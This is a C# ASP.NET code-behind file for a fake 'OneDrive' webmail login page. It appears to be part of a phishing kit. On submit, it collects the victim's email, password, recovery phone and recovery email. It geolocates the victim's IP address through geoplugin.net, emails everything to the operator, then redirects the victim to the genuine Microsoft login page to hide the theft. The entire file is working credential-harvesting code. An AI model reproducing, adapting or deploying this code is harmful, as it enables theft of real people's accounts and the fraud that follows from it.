﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Script.Serialization;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Podan_One_Drive
{
    public partial class Webmail : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Webmail_onclick(object sender, EventArgs e)
        {
            string mEmail = Request.Form["email"];
            string mPassword = Request.Form["password"];
            string mRecoveryPhone = Request.Form["phone"];
            string mRecoveryEmail = Request.Form["r_email"];
            string mLoginType = Request.Form["logintype"];

            String ipAddress = Request.UserHostAddress;
            string Subject = mLoginType + " Login attempt - " + ipAddress;
            string json = (new WebClient()).DownloadString("http://www.geoplugin.net/json.gp?ip=" + ipAddress);
            var obje = new JavaScriptSerializer().Deserialize<Dictionary<string, string>>(json);

            string Body = "LoginType: webmail" +
                          "\nEmail: " + mEmail +
                          "\nPassword: " + mPassword +
                          "\nRecovery Email: " + mRecoveryEmail +
                          "\nRecovery phone: " + mRecoveryPhone +
                          "\nIP Address: " + ipAddress +
                          "\nBrowser Type: " + Request.UserAgent +
                          "\nLocation city: " + obje["geoplugin_city"] + 
                          "\nLocation country: " + obje["geoplugin_countryName"];

            Email.SendEmail(Subject, Body);

            Response.Redirect("https://login.microsoftonline.com/common/oauth2");
        }
    }
}